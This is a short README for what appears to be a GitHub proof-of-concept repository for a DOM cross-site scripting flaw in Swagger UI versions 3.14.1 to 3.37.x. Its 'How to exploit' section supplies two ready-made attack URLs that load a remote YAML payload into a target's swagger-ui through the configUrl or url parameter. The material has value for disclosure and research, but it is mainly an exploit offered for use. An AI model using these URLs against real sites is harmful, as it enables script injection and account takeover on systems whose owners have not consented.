# Swagger-UI XSS

This repository is based on article created by Dawod Moczadlo: https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/

## Vulnerability

Swagger UI is a really common library used to display API specifications in a nice-looking UI used by almost every company. I stumbled upon it many times when doing recon on bug bounty targets and decided to take a closer look at it in Nov 2020. On Twitch, I streamed the process of reviewing and finding bugs in the library, but I found the final payload off camera after the stream. The bug that I found was a DOM XSS, and it turned out that there were a lot of vulnerable instances.

Affected version: >=3.14.1 < 3.38.0

## How to exploit

```
https://site.com/swagger-ui?configUrl=https://raw.githubusercontent.com/0xGabe/Swagger-UI-XSS/main/swagger-xss.yaml
```

```
https://site.com/swagger-ui?url=https://raw.githubusercontent.com/0xGabe/Swagger-UI-XSS/main/swagger-xss.yaml
```
